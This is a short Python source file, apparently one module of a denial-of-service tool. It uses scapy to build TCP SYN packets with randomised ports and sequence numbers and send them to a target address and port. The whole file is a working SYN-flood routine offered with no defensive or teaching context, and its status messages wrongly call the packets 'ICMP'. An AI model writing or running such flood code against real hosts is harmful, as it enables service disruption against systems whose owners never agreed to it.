# Import modules
from scapy.all import IP, TCP, send, RandShort
from colorama import Fore


def flood(target):
    packet = IP(dst=target[0]) / TCP(
        dport=target[1], flags="S", seq=RandShort(), ack=RandShort(), sport=RandShort()
    )

    for i in range(4):
        try:
            send(packet, verbose=False)
        except Exception as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Error while sending 'ICMP'\n{Fore.MAGENTA}{e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}ICMP packet send to {target[0]} {Fore.RESET}"
            )
